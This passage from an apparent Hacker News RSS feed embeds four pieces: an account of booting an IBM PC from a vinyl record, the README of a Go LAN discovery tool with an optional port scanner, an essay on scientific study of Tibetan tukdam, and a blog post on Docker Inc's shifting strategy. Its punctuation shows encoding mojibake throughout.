&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46730504</guid><pubDate>Fri, 23 Jan 2026 09:50:26 +0000</pubDate></item><item><title>Booting from a vinyl record (2020)</title><link>https://boginjr.com/it/sw/dev/vinyl-boot/</link><description>&lt;doc fingerprint="5c71fe289328686"&gt;
  &lt;main&gt;
    &lt;p&gt;Most PCs tend to boot from a primary media storage, be it a hard disk drive, or a solid-state drive, perhaps from a network, or ‚Äì if all else fails ‚Äì the USB stick or the boot DVD comes to the rescue‚Ä¶ Fun, eh? Boring! Why don‚Äôt we try to boot from a record player for a change?&lt;/p&gt;
    &lt;p&gt;64 512 byte DOS boot disk on a 10‚Ä≥ record, total playing time 06:10 on 45 rpm&lt;/p&gt;
    &lt;p&gt;Update February 2022: Click here to observe the very same vinyl ramdisk booted on an IBM PCjr!&lt;lb/&gt; So this nutty little experiment connects a PC, or an IBM PC to be exact, directly onto a record player through an amplifier. I made a small ROM on-chip boot loader that operates the built-in ‚Äúcassette interface‚Äù of the PC (that was hardly ever used), which will now be invoked by the BIOS if all the other boot options fail, i.e. floppy disk and the hard drive. The turntable spins an analog recording of a small bootable read-only RAM drive, which is 64K in size. This contains a FreeDOS kernel, modified by me to cram it into the memory constraint, a micro variant of COMMAND.COM and a patched version of INTERLNK, that allows file transfer through a printer cable, modified to be runnable on FreeDOS. The bootloader reads the disk image from the audio recording through the cassette modem, loads it to memory and boots the system on it. Simple huh?&lt;/p&gt;
    &lt;p&gt;The vinyl loader code, in a ROM&lt;lb/&gt; (It can also reside on a hard drive or a floppy, but that‚Äôd be cheating)&lt;/p&gt;
    &lt;p&gt;And now to get more technical: this is basically a merge between BootLPT/86 and 5150CAXX, minus the printer port support. It also resides in a ROM, in the BIOS expansion socket, but it does not have to. The connecting cable between the PC and the record player amplifier is the same as with 5150CAXX, just without the line-in (PC data out) jack.&lt;lb/&gt; The ‚Äúcassette interface‚Äù itself is just PC speaker timer channel 2 for the output, and 8255A-5 PPI port C channel 4 (PC4, I/O port 62h bit 4) for the input. BIOS INT 15h routines are used for software (de)modulation.&lt;lb/&gt; The boot image is the same 64K BOOTDISK.IMG ‚Äúexample‚Äù RAM drive that can be downloaded at the bottom of the BootLPT article. This has been turned into an ‚ÄúIBM cassette tape‚Äù-protocol compliant audio signal using 5150CAXX, and sent straight to a record cutting lathe.&lt;lb/&gt; Vinyls are cut with an RIAA equalization curve that a preamp usually reverses during playback, but not perfectly. So some signal correction had to be applied from the amplifier, as I couldn‚Äôt make it work right with the line output straight from the phono preamp. In my case, involving a vintage Harman&amp;amp;Kardon 6300 amplifier with an integrated MM phono preamp, I had to fade the treble all the way down to -10dB/10kHz, increase bass equalization to approx. +6dB/50Hz and reduce the volume level to approximately 0.7 volts peak, so it doesn‚Äôt distort. All this, naturally, with any phase and loudness correction turned off.&lt;lb/&gt; Of course, the cassette modem does not give a hoot in hell about where the signal is coming from. Notwithstanding, the recording needs to be pristine and contain no pops or loud crackles (vinyl) or modulation/frequency drop-outs (tape) that will break the data stream from continuing. However, some wow is tolerated, and the speed can be 2 or 3 percent higher or lower too.&lt;/p&gt;
    &lt;p&gt;Bootloader in a ROM; being an EPROM for a good measure&lt;/p&gt;
    &lt;p&gt;And that‚Äôs it! For those interested, the bootloader binary designed for a 2364 chip (2764s can be used, through an adaptor), can be obtained here. It assumes an IBM 5150 with a monochrome screen and at least 512K of RAM, which kind of reminds me of my setup (what a coincidence). The boot disk image can be obtained at the bottom of the BootLPT/86 article, and here‚Äôs its analog variant, straight from the grooves üôÇ&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46730885</guid><pubDate>Fri, 23 Jan 2026 10:39:09 +0000</pubDate></item><item><title>Show HN: Whosthere: A LAN discovery tool with a modern TUI, written in Go</title><link>https://github.com/ramonvermeulen/whosthere</link><description>&lt;doc fingerprint="b709fb1d9ea3f390"&gt;
  &lt;main&gt;
    &lt;p&gt;Local Area Network discovery tool with a modern Terminal User Interface (TUI) written in Go. Discover, explore, and understand your LAN in an intuitive way.&lt;/p&gt;
    &lt;p&gt;Whosthere performs unprivileged, concurrent scans using mDNS and SSDP scanners. Additionally, it sweeps the local subnet by attempting TCP/UDP connections to trigger ARP resolution, then reads the ARP cache to identify devices on your Local Area Network. This technique populates the ARP cache without requiring elevated privileges. All discovered devices are enhanced with OUI lookups to display manufacturers when available.&lt;/p&gt;
    &lt;p&gt;Whosthere provides a friendly, intuitive way to answer the question every network administrator asks: "Who's there on my network?"&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Modern TUI: Navigate and explore discovered devices intuitively.&lt;/item&gt;
      &lt;item&gt;Fast &amp;amp; Concurrent: Leverages multiple discovery methods simultaneously.&lt;/item&gt;
      &lt;item&gt;No Elevated Privileges Required: Runs entirely in user-space.&lt;/item&gt;
      &lt;item&gt;Device Enrichment: Uses OUI lookup to show device manufacturers.&lt;/item&gt;
      &lt;item&gt;Integrated Port Scanner: Optional service discovery on found hosts (only scan devices with permission!).&lt;/item&gt;
      &lt;item&gt;Daemon Mode with HTTP API: Run in the background and integrate with other tools.&lt;/item&gt;
      &lt;item&gt;Theming &amp;amp; Configuration: Personalize the look and behavior via YAML configuration.&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;brew tap ramonvermeulen/whosthere
brew install whosthere&lt;/code&gt;
    &lt;p&gt;Or with Go:&lt;/p&gt;
    &lt;code&gt;go install github.com/ramonvermeulen/whosthere@latest&lt;/code&gt;
    &lt;p&gt;Or build from source:&lt;/p&gt;
    &lt;code&gt;git clone https://github.com/ramonvermeulen/whosthere.git
cd whosthere
make build&lt;/code&gt;
    &lt;p&gt;Run the TUI for interactive discovery:&lt;/p&gt;
    &lt;code&gt;whosthere&lt;/code&gt;
    &lt;p&gt;Run as a daemon with HTTP API:&lt;/p&gt;
    &lt;code&gt;whosthere daemon --port 8080&lt;/code&gt;
    &lt;p&gt;Additional command line options can be found by running:&lt;/p&gt;
    &lt;code&gt;whosthere --help&lt;/code&gt;
    &lt;p&gt;Whosthere is supported on the following platforms:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Linux&lt;/item&gt;
      &lt;item&gt;macOS&lt;/item&gt;
      &lt;item&gt;Windows (maybe in the future, contributions welcome!)&lt;/item&gt;
    &lt;/list&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Key&lt;/cell&gt;
        &lt;cell role="head"&gt;Action&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;/&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Start regex search&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;k&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Up&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;j&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Down&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;g&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Go to top&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;G&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Go to bottom&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;y&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Copy IP of selected device&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;enter&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Show device details&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;CTRL+t&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Toggle theme selector&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;CTRL+c&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Stop application&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;ESC&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Clear search / Go back&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;&lt;code&gt;p&lt;/code&gt; (details view)&lt;/cell&gt;
        &lt;cell&gt;Start port scan on device&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;&lt;code&gt;tab&lt;/code&gt; (modal view)&lt;/cell&gt;
        &lt;cell&gt;Switch button selection&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Variable&lt;/cell&gt;
        &lt;cell role="head"&gt;Description&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;WHOSTHERE_CONFIG&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Path to the configuration file, to be able to overwrite the default location.&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;code&gt;WHOSTHERE_LOG&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Set the log level (e.g., &lt;code&gt;debug&lt;/code&gt;, &lt;code&gt;info&lt;/code&gt;, &lt;code&gt;warn&lt;/code&gt;, &lt;code&gt;error&lt;/code&gt;). Defaults to &lt;code&gt;info&lt;/code&gt;.&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Whosthere can be configured via a YAML configuration file. By default, it looks for the configuration file in the following order:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Path specified in the &lt;code&gt;WHOSTHERE_CONFIG&lt;/code&gt;environment variable (if set)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;$XDG_CONFIG_HOME/whosthere/config.yaml&lt;/code&gt;(if&lt;code&gt;XDG_CONFIG_HOME&lt;/code&gt;is set)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;~/.config/whosthere/config.yaml&lt;/code&gt;(otherwise)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;When not running in TUI mode, logs are also written to the console output.&lt;/p&gt;
    &lt;p&gt;Example of the default configuration file:&lt;/p&gt;
    &lt;code&gt;# How often to run discovery scans
scan_interval: 20s

# Maximum duration for each scan
# If you set this too low some scanners or the sweeper might not complete in time
scan_duration: 10s

# Splash screen configuration
splash:
  enabled: true
  delay: 1s

# Theme configuration
theme:
  # Configure the theme to use for the TUI, complete list of available themes at:
  # https://github.com/ramonvermeulen/whosthere/tree/main/internal/ui/theme/theme.go
  # Set name to "custom" to use the custom colors below
  # For any color that is not configured it will take the default theme value as fallback
  name: default

  # Custom theme colors (uncomment and set name: custom to use)
  # primitive_background_color: "#000a1a"
  # contrast_background_color: "#001a33"
  # more_contrast_background_color: "#003366"
  # border_color: "#0088ff"
  # title_color: "#00ffff"
  # graphics_color: "#00ffaa"
  # primary_text_color: "#cceeff"
  # secondary_text_color: "#6699ff"
  # tertiary_text_color: "#ffaa00"
  # inverse_text_color: "#000a1a"
  # contrast_secondary_text_color: "#88ddff"

# Scanner configuration
scanners:
  mdns:
    enabled: true
  ssdp:
    enabled: true
  arp:
    enabled: true

# Port scanner configuration
port_scanner:
  timeout: 5s
  # List of TCP ports to scan on discovered devices
  tcp: [21, 22, 23, 25, 80, 110, 135, 139, 143, 389, 443, 445, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 8080, 8443, 9000, 9090, 9200, 9300, 10000, 27017]

# Uncomment the next line to configure a specific network interface - uses OS default if not set
# network_interface: lo0&lt;/code&gt;
    &lt;p&gt;When running Whosthere in daemon mode, it exposes an very simplistic HTTP API with the following endpoints:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Method&lt;/cell&gt;
        &lt;cell role="head"&gt;Endpoint&lt;/cell&gt;
        &lt;cell role="head"&gt;Description&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;GET&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;/devices&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Get list of all discovered devices&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;GET&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;/device/{ip}&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Get details of a specific device&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;GET&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;/health&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Health check&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Theme can be configured via the configuration file, or at runtime via the &lt;code&gt;CTRL+t&lt;/code&gt; key binding.
A complete list of available themes can be found here, feel free to open a PR to add your own theme!&lt;/p&gt;
    &lt;p&gt;Example of theme configuration:&lt;/p&gt;
    &lt;code&gt;theme:
  name: cyberpunk&lt;/code&gt;
    &lt;p&gt;When the &lt;code&gt;name&lt;/code&gt; is set to &lt;code&gt;custom&lt;/code&gt;, the other color options can be used to create your own custom theme.&lt;/p&gt;
    &lt;p&gt;Logs are written to the application's state directory:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;$XDG_STATE_HOME/whosthere/app.log&lt;/code&gt;(if&lt;code&gt;XDG_STATE_HOME&lt;/code&gt;is set)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;~/.local/state/whosthere/app.log&lt;/code&gt;(otherwise)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;When not running in TUI mode, logs are also output to the console.&lt;/p&gt;
    &lt;p&gt;For clipboard functionality to work:&lt;/p&gt;
    &lt;p&gt;Runtime requirements:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Linux (X11): X11 client library (e.g., &lt;code&gt;libx11-6&lt;/code&gt;on Ubuntu,&lt;code&gt;libX11&lt;/code&gt;on Fedora/Arch, often pre-installed).&lt;/item&gt;
      &lt;item&gt;Linux (Wayland): Not natively supported. May require XWayland.&lt;/item&gt;
      &lt;item&gt;macOS/Windows: No dependencies.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Build requirements (when compiling from source):&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Linux: X11 development package (&lt;code&gt;libx11-dev&lt;/code&gt;,&lt;code&gt;libX11-devel&lt;/code&gt;, or&lt;code&gt;libx11&lt;/code&gt;)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Whosthere is intended for use on networks where you have permission to perform network discovery and scanning, such as your own home network. Unauthorized scanning of networks may be illegal and unethical. Always obtain proper authorization before using this tool on any network.&lt;/p&gt;
    &lt;p&gt;Contributions and suggestions such as feature requests, bug reports, or improvements are welcome! Feel free to open issues or submit pull requests on the GitHub repository. Please make sure to discuss any major changes on a Github issue before implementing them.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46731432</guid><pubDate>Fri, 23 Jan 2026 11:54:53 +0000</pubDate></item><item><title>Presence in Death</title><link>https://rubinmuseum.org/presence-in-death/</link><description>&lt;doc fingerprint="bf9c9a2f1fa79b9c"&gt;
  &lt;main&gt;
    &lt;p&gt;In what Tibetan Buddhists call tukdam (Wylie transliteration: thugs dam), experienced meditators die in meditative equipoise. Their bodies do not show the usual signs of death‚Äîsuch as smell, rigor mortis, or decomposition‚Äîfor days or even weeks after their clinical deaths. They appear lifelike, and many even remain sitting upright in meditation posture. From the Tibetan Buddhist point of view, the meditators are resting in a subtle state of consciousness with an associated subtle material energy present in the body. They are still in the process of dying. Yet according to modern biomedical and legal definitions, they are dead. Many cases of tukdam have now been scientifically documented.&lt;/p&gt;
    &lt;p&gt;For my 2022 documentary film Tukdam: Between Worlds and research for my PhD in medical anthropology, I have been following the Tukdam Project, a groundbreaking scientific research initiative lead from the Center for Healthy Minds at the University of Wisconsin‚ÄîMadison and headed by renowned neuroscientist Richard Davidson.* It has focused on documenting tukdam bodies and trying to understand why the decomposition process seems to be delayed. His Holiness the Dalai Lama initiated this multidisciplinary project, which has been carried out with Tibetan collaborators from Delek Hospital in Dharamshala and Men-Tsee-Khang (Tibetan Medical and Astro-Science Institute) traditional Tibetan medicine doctors in India. In recent years, Russian and Indian scientific collaborators have also joined the effort to understand tukdam scientifically.&lt;/p&gt;
    &lt;p&gt;In following the project, I have been struck by the differing expectations and even cross-purposes that the Tibetan and scientific parties seem to harbor. Tibetans hope the research may reveal something about a subtle nature of consciousness that continues beyond clinical and brain death, and which is held to be responsible for keeping the bodies fresh. The Dalai Lama also seems to be invested in this research because of its potential to reveal something about the nature of consciousness that transcends the brain-body complex and even this life.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;IN TUKDAM, CLINICALLY DEAD MEDITATORS ARE SAID TO DWELL IN THE LUMINOSITY OF EMPTINESS.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;While the non-decaying tukdam body signifies the presence of consciousness for Tibetans, this is not obvious from a biophysical scientific perspective. Indeed, the Center for Healthy Minds has been looking for possible residual activity in the brainstem‚Äîa primitive part of the brain not thought to be involved in consciousness‚Äîas a factor contributing to the unusual integration of the bodies. In 2021, the research team published a null-finding stating they had not found any activity in the brain so far. Compelled to operate within a biophysical paradigm, scientists are also interested in possible changes to cell metabolism and breakdown, brought about by years of meditation practice, as perhaps contributing to the pristine postmortem state of tukdam bodies. But taking samples from the bodies has so far been out of the question due to cultural sensitivity and the sacredness of these deaths. Tibetans are concerned that invasive procedures could disturb the postmortem meditative state and the potential it carries for spiritual liberation and achieving a good rebirth.&lt;/p&gt;
    &lt;p&gt;An exchange from Tukdam: Between Worlds illustrates some of the tensions and cross-purposes with which the scientists and Tibetan parties have been operating, although there have been developments in the research and collaboration since the time of shooting in 2019 to early 2020. The scene shows a meeting where Dr. Dylan Lott, who was then the Tukdam Project manager in India, presents the current state of the research and its findings to Tibetan project collaborators. The Dalai Lama‚Äôs personal physician, Dr. Tsetan Dorji Sadutshang, expresses frustration over the lack of results from years of research and what he sees as a misguided approach to explain tukdam in neuroscientific terms. According to the Tibetan view, something far more subtle than the ‚Äúgross‚Äù mind related to the brain and senses is responsible for the physical signs of tukdam.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Dr. Tsetan:&lt;/p&gt;
      &lt;p&gt;To me, from my understanding of His Holiness‚Äô hope from this project, really is to have some proof that there is some sort of consciousness . . . or a mind continuing, that goes on beyond this life, basically. The only first kindergarten step is really to say: Is there a difference between a gross mind and a subtle mind?&lt;/p&gt;
      &lt;p&gt;Dr. Lott:&lt;/p&gt;
      &lt;p&gt;We cannot prove rebirth. We cannot prove mind. We cannot prove subtle mind. What we can do is look at the effects of those practices on the body that are unusual and that Western science, or medical science, doesn‚Äôt have a good explanation for.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;As is the case with science, it is not obvious to all Buddhist traditions that a non-decomposing body proves the presence of consciousness. The medieval Chinese Chan tradition, for example, also records miraculously preserved meditators‚Äô bodies. These did not, however, signify present consciousness, which according to widespread Buddhist doctrine, departs immediately at death to be reborn or to enter nirvana. Here the body is preserved due to purification by religious practice and virtue accumulated while alive.&lt;/p&gt;
    &lt;p&gt;There is something paradoxical in taking the non-decaying body as evidence for a consciousness that transcends the body and physicality. However, here we should be careful to note that in the Tibetan Buddhist tantric tradition different levels of mind are associated with different types of embodiment. Subtler forms of consciousness are associated with tantric subtle bodies or physiologies familiar to advanced tantric practitioners. As these are in a way two sides of the same coin, mind always affects body and vice versa. Such subtle bodies are arguably different from, though connected to, the ‚Äúgross‚Äù biomedical body that scientists work with, which also shows effects of subtle levels of mind and embodiment.&lt;/p&gt;
    &lt;p&gt;Tibetan tradition exhibits a great deal of sophistication and specificity when it comes to signs or ways of ascertaining whether a person is in tukdam‚Äîas well as when it ends. The body will slump over if it was sitting upright; smell and normal signs of decomposition will appear. In accordance with subtle tantric physiology, red and white liquids may come out the nostrils and genitals. These are all signs that even the most subtle consciousness has departed. For Tibetans, final death occurs when the mind leaves the body, which could be weeks after clinical death in cases of tukdam,or hours to days for ‚Äúnormal‚Äù deaths.&lt;/p&gt;
    &lt;p&gt;There is also a tantalizing tradition of ending tukdam that could be seen as indicative of consciousness. If tukdam goes on too long, it may be ended by ringing a bell near the ear of the deceased practitioner, saying certain prayers, or asking them to end their meditation. The body then reportedly collapses and decomposition takes over. This could imply responsivity on the part of the deceased meditators, bearing on questions of consciousness. In an interview piece that did not make the final cut of my documentary, the Dalai Lama recounted this story:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;One lama I had a very close connection [with] . . . Last few years his physical [condition] was very, very weak. And then in my last meeting in Mongolia, I told him, ‚ÄúNow time has come. You have to think about your next life.‚Äù Then around the end of the year, with New Year soon, I received one message from him: ‚ÄúWhen I should die? Where I should die?‚Äù . . . Quite silly, ‚Äúwhere I should die, when I should die!‚Äù Then accordingly I also answered a silly sort of answer, ‚ÄúYou should die in Mongolia. The time, not end of the year but the beginning of the year, New Year.‚Äù He exactly, I think in the first week of the New Year, then he died. Then I sent my representative with my [ceremonial silk] scarf. I think it took two days . . . When my representative reached his place and put the scarf which I sent . . . on his neck, then he ended his tukdam. [Dalai Lama makes gesture of body slumping over.] So these are quite mysterious things. There are some elements to control. It is quite obvious as soon as the tukdam ends, the physical [body] clearly shows real death, the real corpse.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;People often report feeling a meditative calm or presence when entering the room of someone in tukdam. Some of the American scientists researching tukdam also said they felt it. But such things seem difficult to measure and to be firmly in the realm of first-person experience as opposed to the third-person observation of natural science. This does not, however, necessarily make such perceptions less real. As another Tukdam Project collaborator, senior Tibetan medicine doctor Tsewang Tamdin, told me, ‚ÄúJust because something is invisible does not mean it does not exist.‚Äù&lt;/p&gt;
    &lt;p&gt;As in life and death, the dynamic of presence and absence is central to tukdam. Here we come to a basic conflict between the Tibetan Buddhist and current biomedical views of death. For the latter, death unequivocally means absence. Once the heart shuts down, brain death quickly follows ‚Äúunless it‚Äôs been inflicted before the heart stopped‚Äù and the person is gone. But for Tibetan Buddhists, there is presence, or mind, in death.&lt;/p&gt;
    &lt;p&gt;*Richard Davidson is a member of the Rubin Museum‚Äôs advisory board.&lt;/p&gt;
    &lt;p&gt;Donagh Coleman is a Finnish-Irish-American filmmaker. Previous award-winning documentaries with international festival and TV exposure include Stone Pastures and A Gesar Bard‚Äôs Tale. Donagh‚Äôs films have been shown by the European Commission and museums such as MoMA and the Rubin Museum. Donagh is currently doing a PhD in medical anthropology at University of California, Berkeley and holds degrees in philosophy and psychology and music and media technologies from Trinity College Dublin, as well as a master‚Äôs in Asian studies from University of California, Berkeley.&lt;/p&gt;
    &lt;p&gt;Get the latest news and stories from the Rubin, plus occasional information on how to support our work.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46731612</guid><pubDate>Fri, 23 Jan 2026 12:16:54 +0000</pubDate></item><item><title>What has Docker become?</title><link>https://tuananh.net/2026/01/20/what-has-docker-become/</link><description>&lt;doc fingerprint="3d97b07b1d651558"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;What has Docker become?&lt;/head&gt;
    &lt;head rend="h5"&gt;Posted on January 20, 2026 ‚Ä¢ 4 minutes ‚Ä¢ 851 words&lt;/head&gt;
    &lt;p&gt;It‚Äôs weird to see Docker Inc (the company) struggle to find its place in 2026. What started as the company that revolutionized how we deploy applications has been through multiple identity crises, pivoting from one strategy to another in search of sustainable revenue and market relevance.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Identity Crisis&lt;/head&gt;
    &lt;p&gt;Docker‚Äôs journey reads like a startup trying to find product-market fit, except Docker already had product-market fit - they created the containerization standard that everyone uses. The problem is that Docker the technology became so successful that Docker the company struggled to monetize it. When your core product becomes commoditized and open source, you need to find new ways to add value.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Swarm Exit&lt;/head&gt;
    &lt;p&gt;Docker Swarm was Docker‚Äôs attempt to compete with Kubernetes in the orchestration space. But Kubernetes won that battle decisively, and Docker eventually sold Swarm. This was a clear signal that Docker was stepping back from trying to be the full-stack container platform and instead focusing on what they could uniquely provide.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Developer Tools Pivot&lt;/head&gt;
    &lt;p&gt;For a while, Docker seemed to focus on developer experience. This made sense - developers are Docker‚Äôs core users, and improving their workflow could be a differentiator. Docker Scout emerged from the acquisition of Atomist in June 2022, bringing ‚Äúsoftware supply chain‚Äù capabilities. Scout allows Docker to see not just what‚Äôs in a container, but how it was built and where vulnerabilities are. This was a smart move toward security and observability, areas where Docker could add real value.&lt;/p&gt;
    &lt;p&gt;Docker also acquired AtomicJar, the company behind Testcontainers, adding shift-left testing capabilities. Testcontainers lets developers run real dependencies (databases, message queues, etc.) in containers during testing, making integration tests more reliable and closer to production environments.&lt;/p&gt;
    &lt;head rend="h2"&gt;The AI Pivot&lt;/head&gt;
    &lt;p&gt;Then came the AI pivot. Docker Model Runner entered the scene, positioning Docker as a platform for running AI models. Docker Compose expanded to support AI agents and models. Docker Offload was introduced for cloud-scale GPU execution of AI tasks. Partnerships with Google Cloud, Microsoft Azure, and AI SDKs (CrewAI, LangGraph, Vercel AI SDK) followed.&lt;/p&gt;
    &lt;p&gt;The acquisition of MCP Defender in September 2025 further cemented Docker‚Äôs move into AI security, focusing on securing agentic AI infrastructure and runtime threat detection. This was a significant shift - from developer tools to AI infrastructure.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Hardened Images Move&lt;/head&gt;
    &lt;p&gt;Suddenly, Docker moved into the hardened images space. In December 2025, Docker made over 1,000 Docker Hardened Images free and open source under Apache 2.0, reducing vulnerabilities by up to 95% compared to traditional images. This move was likely triggered by Chainguard‚Äôs success in the secure container image space. Chainguard had been building a business around minimal, secure container images, and Docker needed to respond.&lt;/p&gt;
    &lt;p&gt;Making hardened images free was a bold move - it‚Äôs hard to compete with free, especially when it‚Äôs open source. But it also raises questions about Docker‚Äôs business model. If you‚Äôre giving away your security features for free, what are you selling?&lt;/p&gt;
    &lt;head rend="h2"&gt;Leadership Changes and Acquisition Speculation&lt;/head&gt;
    &lt;p&gt;In February 2025, Docker replaced CEO Scott Johnston (who led the company since 2019) with Don Johnson, a former Oracle Cloud Infrastructure founder and executive vice president. This leadership transition has prompted tech analysts to anticipate a potential acquisition by a major cloud provider. The CEO swap, combined with the strategic pivots, suggests Docker may be positioning itself for sale rather than building a standalone business.&lt;/p&gt;
    &lt;head rend="h2"&gt;What This All Means&lt;/head&gt;
    &lt;p&gt;Docker‚Äôs strategic shifts tell a story of a company searching for its place in a market it helped create. The containerization technology Docker pioneered became so successful that it became infrastructure - something everyone uses but no one wants to pay for directly.&lt;/p&gt;
    &lt;p&gt;The pivots from orchestration (Swarm) to developer tools (Scout, Testcontainers) to AI (Model Runner, MCP Defender) to security (Hardened Images) show a company trying different approaches to find sustainable revenue. Each pivot makes sense in isolation, but together they paint a picture of a company without a clear long-term vision.&lt;/p&gt;
    &lt;p&gt;The hardened images move is particularly interesting because it‚Äôs defensive - responding to Chainguard‚Äôs success rather than leading with innovation. Making it free and open source is a strong competitive move, but it doesn‚Äôt solve the fundamental business model question.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Future&lt;/head&gt;
    &lt;p&gt;Docker the technology isn‚Äôt going anywhere. It‚Äôs too embedded in the infrastructure of modern software development. But Docker the company? That‚Äôs less clear. The leadership change, acquisition speculation, and rapid strategic pivots suggest Docker Inc may be positioning itself for an exit rather than building a long-term independent business.&lt;/p&gt;
    &lt;p&gt;For developers, this doesn‚Äôt change much. Docker containers will continue to work, and the open source nature of Docker means the technology will persist regardless of what happens to the company. But it‚Äôs worth watching how Docker Inc‚Äôs search for identity plays out - it could affect the ecosystem of tools and services built around containers.&lt;/p&gt;
    &lt;p&gt;The irony is that Docker created a standard so successful that it became infrastructure, and infrastructure is hard to monetize. Docker Inc‚Äôs struggle to find its place is a cautionary tale about the challenges of building a business around open source technology that becomes too successful.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46731748</guid><pubDate>Fri, 23 Jan 2026 12:36:17 +0000</pubDate></item><item><title>European Alternatives</title><link>https://european-alternatives.eu</link><description>&lt;doc fingerprint="8c31fd39e929e0e6"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;European alternatives for digital products&lt;/head&gt;
    &lt;head rend="h2"&gt;We help you find European alternatives for digital service and products, like cloud services and SaaS products.&lt;/head&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;
        &lt;p&gt;Support local businesses&lt;/p&gt;
      &lt;/item&gt;
